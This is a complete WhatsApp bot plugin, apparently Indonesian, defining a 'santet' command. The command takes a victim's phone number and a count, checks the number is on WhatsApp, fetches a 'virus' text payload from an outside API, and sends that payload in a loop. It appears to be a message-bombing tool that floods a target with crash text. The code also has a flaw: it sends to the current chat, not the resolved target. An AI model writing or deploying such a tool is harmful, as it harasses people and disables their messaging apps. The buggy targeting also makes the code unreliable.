let fetch = require('node-fetch')

let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) throw `Cara Penggunaan:\n\n${usedPrefix}${command} 628xxxxx|jumlah`
    let [nomor, jumlah] = text.split('|');
    if ((!nomor) || (!jumlah)) throw `*Cara penggunaan :*\n\n${usedPrefix}${command} 628xxxxx|jumlah`
    let jid = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let data = (await conn.onWhatsApp(jid))[0] || {};
    if (!data.exists) throw 'Nomer tidak terdaftar di WhatsApp.';
    let dann = await fetch('https://saipulanuar.ga/api/virus/ngazap')
    let res = await dann.json()
    for (let i = 0; i < jumlah; i++) {
    let id = +new Date
    let pesan = `${res.result}`
    conn.sendMessage(m.chat, pesan, { quoted: m})
   }
 }
 
 handler.help = ['santet']
 handler.tags = ['tools']
 handler.command = /^(santet)$/i
 
 module.exports = handler